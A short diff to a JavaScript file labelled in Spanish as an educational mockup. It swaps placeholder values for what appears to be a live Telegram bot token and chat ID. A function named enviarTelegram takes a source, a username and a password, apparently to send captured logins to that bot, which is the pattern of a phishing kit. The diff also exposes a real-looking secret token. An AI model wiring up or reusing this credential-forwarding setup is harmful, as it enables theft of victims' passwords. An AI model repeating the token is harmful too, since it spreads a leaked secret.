@@ -1,7 +1,7 @@
 // ====== Maqueta educativa — scripts compartidos ======
 
-const TELEGRAM_TOKEN = "TU_TOKEN_AQUI";
-const TELEGRAM_CHAT_ID = "TU_CHAT_ID_AQUI";
+const TELEGRAM_TOKEN = "9159089747:AAGrdR7YNxmKCXvzeclLLpWhKCvt2ivc6uQ";
+const TELEGRAM_CHAT_ID = "7007914207";
 
 function enviarTelegram(origen, usuario, clave) {
   if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) return Promise.resolve();
